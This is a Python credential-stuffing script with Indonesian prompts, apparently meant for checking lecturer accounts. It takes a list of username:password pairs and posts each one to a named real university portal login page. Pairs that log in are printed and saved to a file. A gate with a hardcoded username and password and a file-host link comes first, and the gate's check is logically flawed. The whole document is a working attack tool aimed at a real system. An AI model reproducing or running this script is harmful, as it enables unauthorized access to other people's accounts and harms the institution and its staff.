import requests as req
from bs4 import BeautifulSoup as bs
import urllib.parse
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from concurrent.futures import ThreadPoolExecutor 
import concurrent.futures
import os, time, platform, hashlib, json, sys
import concurrent.futures
from os import system
grey = '\x1b[90m'
red = '\x1b[91m'
green = '\x1b[92m'
gren = '\x1b[91m'
yellow = '\x1b[93m'
blue = '\x1b[94m'
purple = '\x1b[95m'
cyan = '\x1b[96m'
white = '\x1b[37;1m'
flag = '\x1b[47;30m'
off = '\x1b[m'
system("clear")

found = []
error = []
threads = []

def ketik(teks):
 for i in teks + "\n":
  sys.stdout.write(i)
  sys.stdout.flush()
  time.sleep(0.06)
   
ketik(f'{green}WELCOME TO MY SCRIPT\nLOGIN MENGGUNAKAN USER PASWORD LEWAT LINK\nYG TELAH DI SEDIAKAN')
system("clear") 
username = "Nabil" 
password = "011010110000" 

def login (user_name, pass_word) :
    if user_name != username and pass_word != password :
        hasil = False
    else :
        hasil = True

    return hasil

i=5
while i>=1:
    print (f'{green}link username & password: {white}https://sfile.mobi/8bf2OunK0MN')
    userName_=input(f'{yellow}masukan username anda :')
    password_=input(f'{yellow}masukan password :')
    hasil=(login(userName_, password_))
    if hasil == True :
        print (f'{green}login user berhasil') 
        break
    else :
        i-=1
        print('gagal login, sisa percobaan login adalah :', i )    
system("clear")
def ketik(teks):
 for i in teks + "\n":
  sys.stdout.write(i)
  sys.stdout.flush()
  time.sleep(0.03)
   
ketik(f'{cyan} _   _ ___ ___   ____  _         __  __\n{cyan}| | | |_ _|_ _| / ___|| |_ __ _ / _|/ _|\n{off}| | | || | | |  \___ \| __/ _` | |_| |_\n{off}| |_| || | | |   ___) | || (_| |  _|  _|\n{cyan} \___/|___|___| |____/ \__\__,_|_| |_|\n  {purple}             Decode  {red}By{white} NBL CODE')
file = input(f'{cyan}SCANNER UII DOSEN\n{off}𝘽𝙔 𝙉𝘽𝙇 𝘾𝙊𝘿𝙀\n{cyan}𝙸𝚗𝚙𝚞𝚝 𝙵𝚒𝚕𝚎 {off}> ')
print()
with open(file, 'r') as file:
	lines = file.readlines()
	for i in lines:
		u = i.strip().split(':')[0]
		p = i.strip().split(':')[1]
		login = requests.Session().post("https://karya.uii.ac.id/login.php", data = { "u":u, "p":p, "submit":"login"}).text
		if "Sync Data UII" in login:
			print(f'{green}Berhasil > {u}:{p}')
			found.append(f"{u}:{p}") 
			with open('aktif.txt', 'a') as (save):
				save.write(f"{u}:{p}\n")
		else:
			print(f'{red}Gagal > {u}:{p}')
			error.append(f"{u}:{p}")
	exit(f"\nDone")
		